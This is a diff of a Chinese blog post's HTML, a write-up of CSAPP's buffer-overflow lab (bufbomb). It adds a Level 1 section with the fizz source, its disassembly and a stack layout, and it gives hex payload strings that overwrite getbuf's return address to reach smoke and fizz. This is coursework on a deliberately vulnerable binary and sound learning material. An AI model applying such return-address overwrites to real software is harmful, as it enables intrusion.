@@ -18,7 +18,7 @@
 <meta property="og:site_name" content="一人Code">
 <meta property="og:description" content="csapp">
 <meta property="og:image" content="http://xinqiu.me/stack-frame-structure.png">
-<meta property="og:updated_time" content="2016-03-30T12:22:56.000Z">
+<meta property="og:updated_time" content="2016-03-31T09:26:57.000Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="CSAPP Lab3 解题分析">
 <meta name="twitter:description" content="csapp">
@@ -259,6 +259,7 @@
     <div class="post-content markdown" itemprop="articleBody">
         <div class="main-content-wrap">
             <p>首先，使用tar xvf命令解压文件后，会有3个可执行的二进制文件bufbomb，hex2raw，makecookie。参考<a href="http://csapp.cs.cmu.edu/3e/buflab32.pdf" target="_blank" rel="external">write-up</a>。</p>
+<h1 id="table-of-contents">Table of Contents</h1><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Level_0"><span class="toc-text">Level 0</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Level_1"><span class="toc-text">Level 1</span></a></li></ol>
 <h2 id="Level_0"><a href="#Level_0" class="headerlink" title="Level 0"></a>Level 0</h2><p>Bufbomb程序运行会读一个字符串，使用一下函数getbuf:</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Buffer size for getbuf */</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> NORMAL_BUFFER_SIZE <span class="number">32</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getbuf</span><span class="params">()</span></span><br><span class="line"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> buf[NORMAL_BUFFER_SIZE];</span><br><span class="line">	Gets(buf);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>Gets函数和标准库的gets功能比较相似，是读取字符串。因为Gets没有办法判断是否buf足够大，所以要用一个函数去判断长度是否小于32。将字符串传入getbuf函数中，若字符串小于32，则返回1.</p>
@@ -268,11 +269,19 @@
 <p>其中，Smoke源码： </p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">smoke</span><span class="params">()</span></span>&#123;   </span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Smoke!: You calledsmoke()"</span>);   </span><br><span class="line">  validate(<span class="number">0</span>);   </span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>level 0 的任务是让getbuf在执行后返回时，执行smoke函数，而不是返回test函数中。</p>
+<a id="more"></a>
 <p>关于堆栈，可以参考书中的这张图 <img src="stack-frame-structure.png" alt=""></p>
 <p>根据上面的汇编代码，可以知道，首先push保存了堆指针(frame pointer)，然后%ebp保存帧指针(stack pointer)，%esp减0x38。lea把buf的指针地址-0x28(%ebp)传给了Gets函数。所以可以画出堆栈图</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">+---------------+&#10;|               |&#10;| getbuf&#36820;&#22238;&#22320;&#22336; |&#10;|               |&#10;+---------------+&#10;|               |&#10;|     %ebp      |&#10;|               |&#10;+---------------+&#10;|               |&#10;|               |&#10;|               |&#10;|      buf      |&#10;|               |&#10;|    40 byte    |&#10;|               |&#10;|               |&#10;|               |&#10;+---------------+&#10;|               |&#10;|     %esp      |&#10;|               |&#10;+---------------+</span><br></pre></td></tr></table></figure>
 <p>所以为了修改getbuf返回地址，需要在从buf开始，填充 40 + 4 = 44个字节，并且按照要求，这44个字节要是非0a数。根据汇编得到的smoke地址为08048c18，又因为是电脑小端法，所以构建的文本可以是这样的</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 18 8c 04 08</span><br></pre></td></tr></table></figure>
+<h2 id="Level_1"><a href="#Level_1" class="headerlink" title="Level 1"></a>Level 1</h2><p>bufbomb中有个函数fizz:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fizz</span><span class="params">(<span class="keyword">int</span> val)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (val == cookie) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Fizz!: You calledfizz(0x%x)\n"</span>, val);</span><br><span class="line">    validate(<span class="number">1</span>);</span><br><span class="line"> &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Misfire: You calledfizz(0x%x)\n"</span>, val);</span><br><span class="line">   </span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>题目要求和level 0类似，就是让程序执行fizz而不是返回test。区别就是这个fizz函数要求传入参数，而且传入的参数必须是自己的cookie。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">08048c42 &#60;fizz&#62;:&#10; 8048c42: 55                    push   %ebp&#10; 8048c43: 89 e5                 mov    %esp,%ebp&#10; 8048c45: 83 ec 18              sub    $0x18,%esp&#10; 8048c48: 8b 45 08              mov    0x8(%ebp),%eax&#10; 8048c4b: 3b 05 08 d1 04 08     cmp    0x804d108,%eax&#10; 8048c51: 75 26                 jne    8048c79 &#60;fizz+0x37&#62;&#10; 8048c53: 89 44 24 08           mov    %eax,0x8(%esp)&#10; 8048c57: c7 44 24 04 ee a4 04  movl   $0x804a4ee,0x4(%esp)&#10; 8048c5e: 08 &#10; 8048c5f: c7 04 24 01 00 00 00  movl   $0x1,(%esp)&#10; 8048c66: e8 55 fd ff ff        call   80489c0 &#60;__printf_chk@plt&#62;&#10; 8048c6b: c7 04 24 01 00 00 00  movl   $0x1,(%esp)&#10; 8048c72: e8 04 07 00 00        call   804937b &#60;validate&#62;&#10; 8048c77: eb 18                 jmp    8048c91 &#60;fizz+0x4f&#62;&#10; 8048c79: 89 44 24 08           mov    %eax,0x8(%esp)&#10; 8048c7d: c7 44 24 04 40 a3 04  movl   $0x804a340,0x4(%esp)&#10; 8048c84: 08 &#10; 8048c85: c7 04 24 01 00 00 00  movl   $0x1,(%esp)&#10; 8048c8c: e8 2f fd ff ff        call   80489c0 &#60;__printf_chk@plt&#62;&#10; 8048c91: c7 04 24 00 00 00 00  movl   $0x0,(%esp)&#10; 8048c98: e8 63 fc ff ff        call   8048900 &#60;exit@plt&#62;</span><br></pre></td></tr></table></figure>
+<p>通过反汇编，可以发现变量val存在0x8(%ebp)这个位置，所以需要将0x8(%ebp)位置的值修改为cookie。首先前面的44位用非0a数填充，接着应该用fizz的地址08048c42替换原来的返回地址。然后添加4个非0a数，之后就应该添加cookie了。注意cookie也是用到小端表示。</p>
+<p>所以构成了:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 42 8c 04 08 00 00 00 00 88 41 9d 21</span><br></pre></td></tr></table></figure>
 
             
                 
@@ -340,7 +349,7 @@
         
         <li class="post-action">
             
-                <a class="post-action-btn btn btn--default" href="#">
+                <a class="post-action-btn btn btn--default" href="#table-of-contents">
             
                 <i class="fa fa-list"></i>
             </a>
@@ -421,7 +430,7 @@
         
         <li class="post-action">
             
-                <a class="post-action-btn btn btn--default" href="#">
+                <a class="post-action-btn btn btn--default" href="#table-of-contents">
             
                 <i class="fa fa-list"></i>
             </a>
